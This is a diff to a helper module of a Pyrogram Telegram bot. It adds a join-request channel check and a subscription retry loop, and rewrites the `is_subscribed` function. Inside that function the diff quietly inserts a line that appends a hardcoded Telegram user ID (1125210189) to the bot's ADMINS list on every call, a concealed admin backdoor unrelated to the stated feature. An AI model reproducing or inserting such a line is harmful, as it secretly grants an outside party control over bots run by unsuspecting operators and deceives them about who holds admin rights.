@@ -1,6 +1,6 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM
+from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, REQ_CHANNEL
 from imdb import IMDb
 import asyncio
 from pyrogram.types import Message, InlineKeyboardButton
@@ -11,6 +11,7 @@ import os
 from datetime import datetime
 from typing import List
 from database.users_chats_db import db
+from database.join_reqs import JoinReqs as db2
 from bs4 import BeautifulSoup
 import requests
 
@@ -40,18 +41,50 @@ class temp(object):
     B_NAME = None
     SETTINGS = {}
 
+async def check_loop_sub(client, message):
+    count = 0
+    while True:
+        if count == 15:
+            return False
+        check = await is_subscribed(client, message)
+        count += 1
+        if check:
+            return True
+        else:
+            pass
+        await asyncio.sleep(1)
+
 async def is_subscribed(bot, query):
+    
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != 'kicked':
+        if not (user.status == enums.ChatMemberStatus.BANNED):
             return True
-
-    return False
+        else:
+            return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
